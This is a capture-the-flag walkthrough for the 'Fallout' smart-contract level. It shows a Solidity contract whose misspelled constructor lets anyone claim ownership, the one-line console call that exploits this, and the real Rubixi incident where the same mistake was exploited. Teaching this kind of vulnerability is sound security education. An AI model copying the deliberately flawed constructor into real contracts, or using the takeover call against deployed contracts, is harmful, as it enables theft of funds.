# Fallout

## Challenge Description

Claim ownership of the contract below to complete this level.

Things that might help:

-   Solidity Remix IDE

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./utils/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;
    mapping(address => uint) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
    }
}
```

## Challenge Solution Walkthrough

In previous versions of the Solidity compiler, the constructor function was defined with the same name as the contract's name. However, in the given contract, there is a typo in the constructor function name. The function `Fal1out()` should actually be `Fallout()` to serve as the constructor. To solve this challenge, you need to call the `Fal1out()` function. Due to the typo, this function can be called multiple times, allowing anyone to become the owner of the contract.

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

To solve the challenge, open the console and execute the following command:

```javascript
> await contract.Fal1out()
```

After executing the command, you will become the owner of the contract. To verify that you are the owner, run the following command:

```javascript
> (await contract.owner()).toString() == player.toString()
< true
```

If the return value is `true`, it means you have successfully become the owner.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?

Well... Not quite.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```

This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
